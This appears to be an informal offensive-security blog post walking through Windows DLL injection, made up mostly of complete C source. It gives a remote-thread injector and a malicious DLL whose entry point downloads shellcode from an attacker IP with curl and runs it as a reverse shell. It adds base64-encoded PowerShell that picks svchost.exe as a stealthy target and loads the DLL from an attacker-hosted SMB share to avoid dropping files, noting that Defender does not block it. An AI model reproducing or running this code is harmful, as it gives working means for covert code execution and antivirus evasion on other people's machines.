# Intro
It's basically the same as shellcode injection into a process but with like one or two more steps.

Basically DLL's have a switch statement in the main function telling them what to do when. So you can just treat the run on start case as a normal shellcode injector.

# Basic DLL
A POC for a msg box would be:
```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD Reason, LPVOID lpvReserved) {

	switch (Reason) {

	case DLL_PROCESS_ATTACH:
		MessageBox(NULL, L"VALID TEXT", L"HI!!!", MB_ICONQUESTION | MB_OK);
		break;
	}

	return TRUE;
}
```

# DLL Injection POC
So once that is compiled instead of passing in the shellcode as a parameter to `CreateRemoteThread` you pass in the dll.

Setting up the DLL variables. 
```c
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\eljay\\source\\repos\\dllinjection\\mydll.dll";
size_t dllPathSize = sizeof(dllPath);
```

Get a handle to kernel 32 and load the dll:
```c
hKernel32 = GetModuleHandleW(L"Kernel32");
LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
```

Then run the remote thread.
```c
hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

```

The rest of this code is just the boiler plate process injection from the last blog [link](./Shellcode%20Injection.md).

The entire file being:
```c
#include <stdio.h>
#include <Windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\eljay\\source\\repos\\dllinjection\\mydll.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("%s usage: %s <PID>", e, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);

	printf("%s trying to get a handle to the process {%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {

		printf("%s failed to get a handle to the process, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process (%ld)\n--0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("%s allocated buffer to process memory with PAGE_READWRITE permissions\n", k);

	if (rBuffer== NULL) {

		printf("%s could not create rBuffer, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	printf("%s wrote [%S] to process memory\n", k, dllPath);

	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
		printf("%s failed to get a handle to Kernel32.dll, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to Kernel32.dll\n--0x%p\n", k, hKernel32);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s got the address of LoadLibraryW()\n--0x%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the newly-created thread (%ld)\n--0x%p\n", k, TID, hThread);
	printf("%s waiting for thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing, cleaning up...\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s finished! see you next time!", k);

	return EXIT_SUCCESS;

}
```

# Inject Shellcode
So now to just slap in some rev shell shellcode and call it a day.

Instead of grabbing a second thread to the same process from the dll I'm just going to use the dll's own process.

So virtualalloc memcpy then execute with a http stager, just like in the shellcode injection blog. (Was going to do smb stager but to lazy *lol*)
```c
#include <windows.h>

int injectionbit() {

	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char code[460];
	int counter = 0;
	fpipe = (FILE*)_popen(command, "r");
	if (fpipe == NULL){
		return EXIT_FAILURE;
	}
	while(fread(&c, sizeof(c), 1, fpipe)) {
		code[counter] = c;
		counter += 1;
	}
	_pclose(fpipe);
	
	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return EXIT_SUCCESS;
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD Reason, LPVOID lpvReserved) {

	switch (Reason) {

	case DLL_PROCESS_ATTACH:
		injectionbit();
		break;
	}

	return TRUE;
}
```

So compiling everything. Make sure to compile the dll as a dll and change the location of the dll in the injector.

It works!! Nice.

There is still that cmd.exe process, so lets inject somewhere else.

# An attempt at stealth
Asking chatgpt and not wanting to open every process gives this:
```c
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

void ListAllProcesses() {
    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create snapshot of processes." << std::endl;
        return;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshotHandle, &processEntry)) {
        do {
            std::cout << "Process ID: " << processEntry.th32ProcessID
                      << "\tProcess Name: " << processEntry.szExeFile << std::endl;
        } while (Process32Next(snapshotHandle, &processEntry));
    }

    CloseHandle(snapshotHandle);
}

int main() {
    ListAllProcesses();
    return 0;
}
```

Fixing the code so it looks like something I can write and debug:
```c
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

HANDLE hProcesses = NULL;

int main() {
    hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcesses == INVALID_HANDLE_VALUE) {
        printf("%s Failed to create snapshot of processes. error: (%ld)", e, GetLastError());
        return EXIT_FAILURE;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcesses, &processEntry)) {
        do {
            printf("%s Process ID: (%s)\nProcess Name: (%s)", i, processEntry.th32ProcessID, processEntry.szExeFile);
        } while (Process32Next(hProcesses, &processEntry));
    }

    CloseHandle(hProcesses);
    return EXIT_SUCCESS;
}
```

Getting a bunch of warnings and no errors, but dw an AI wrote this so its going to be fine.

Nothing happened. Just going to run the AI's version to see if the code is broken or if my code is broken.

Yea the AI's code works, it doesnt give the process name so kinda pointless.

You could do find string on get process and search for svchosts.exe running with your user and pass it in manually.
```c#
Get-Process | findstr /c:"1 svchost" | %{($_ -split " ")[31]} | Select-Object -first 1

5004
```

We can use popen to run this in a c.

got annoyed trying to escape everything so just b64 encoded it:
```powershell
$text = 'Get-Process | findstr /c:"1 svchost" | %{($_ -split " ")[31]} | Select-Object -first 1'
PS C:\Users\eljay> $text
Get-Process | findstr /c:"1 svchost" | %{($_ -split " ")[31]} | Select-Object -first 1
PS C:\Users\eljay> $b = [System.Text.Encoding]::Unicode.GetBytes($text)
PS C:\Users\eljay> $enc = [Convert]::ToBase64String($b)
PS C:\Users\eljay> $enc

RwBlAHQALQBQAHIAbwBjAGUAcwBzACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGMAOgAiADEAIABzAHYAYwBoAG8AcwB0ACIAIAB8ACAAJQB7ACgAJABfACAALQBzAHAAbABpAHQAIAAiACAAIgApAFsAMwAxAF0AfQAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBmAGkAcgBzAHQAIAAxAA==
```


Throwing that in gives this:
```c
#include <stdio.h>
#include <windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main() {
	FILE* fpipe;
	DWORD PID = NULL;

	const char* command = "powershell.exe -e <b64 command>;
	char code[64];
	fpipe = (FILE*)_popen(command, "r");

	if (fpipe == NULL) {
		printf("%s error running the command error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	if (fgets(code, 64, fpipe) == NULL) {
		printf("%s error reading output of command error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	_pclose(fpipe);

	PID = strtoul(code, NULL, 10);
	printf("%s PID: (%ld)\n", k, PID);

	return EXIT_SUCCESS;
}
```

Adding it all together gives this:
```c
#include <stdio.h>
#include <Windows.h>

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

DWORD PID, TID = NULL;
FILE* fpipe = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\eljay\\source\\repos\\dllinjection\\mydll.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {

	if (argc < 2) {
		/* Find svchost process */

		printf("%s No PID supplied going to use svchost.\n", i);
		printf("%s finding PID.\n", i);
		const char* command = "powershell.exe -e <b64 command>";
		char code[64];
		fpipe = (FILE*)_popen(command, "r");

		/* Run powershell command */
		if (fpipe == NULL) {
			printf("%s error running the command error: %ld", e, GetLastError());
			return EXIT_FAILURE;
		}
		/* Read output */
		if (fgets(code, 64, fpipe) == NULL) {
			printf("%s error reading output of command error: %ld", e, GetLastError());
			return EXIT_FAILURE;
		}

		_pclose(fpipe);

		PID = strtoul(code, NULL, 10);
		printf("%s PID found: (%ld)\n", k, PID);
	}
	else {
		PID = atoi(argv[1]);
	}

	printf("%s trying to get a handle to the process {%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {

		printf("%s failed to get a handle to the process, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process (%ld)\n--0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("%s allocated buffer to process memory with PAGE_READWRITE permissions\n", k);

	if (rBuffer == NULL) {

		printf("%s could not create rBuffer, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	printf("%s wrote [%S] to process memory\n", k, dllPath);

	hKernel32 = GetModuleHandleW(L"Kernel32");

	if (hKernel32 == NULL) {
		printf("%s failed to get a handle to Kernel32.dll, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to Kernel32.dll\n--0x%p\n", k, hKernel32);

	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	printf("%s got the address of LoadLibraryW()\n--0x%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the newly-created thread (%ld)\n--0x%p\n", k, TID, hThread);
	printf("%s waiting for thread to finish execution\n", i);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing, cleaning up...\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s finished! see you next time!", k);

	return EXIT_SUCCESS;

}
```

The cmd.exe is still there.

omg its cause we are running a program with cmd.exe as in:
```shell
cmd.exe /c <exe name>
```

lmao anyways that how you can find and inject into a process using powershell commands.

## Summary
So when running the program the only thing (that i could find) was a cmd.exe process in taskmanager. If you PID is provided it will instead find the pid of svchost.exe and inject into that. This is fine as it is running in the context of your user. When doing this defender could not care less. When injecting into something like notepad.exe defender will alert the user but not kill the shell which is weird.

You can CTRL+C the shell or kill notepad.exe and the shell will still work. (I think this is because the shell was staged but not 100% sure.) Something to try later on would be to find a way to host the DLL. Wonder if a UNC path would work?

## Hosting DLL
on kali host a http server, nc listener and smb server.

smbserver
```bash
smbserver.py share . -ts -debug -smb2support
```

Then change the dllpath to be:
```c
wchar_t dllPath[MAX_PATH] = L"\\\\192.168.153.128\\share\\mydll2.dll";
```

It does work!!

This means that we could now hardcode the shellcode in the dll as we dont need to worry about signatures as the file wont be dropped to disk. 

Also I did end up doing a SMB stager :)


FIN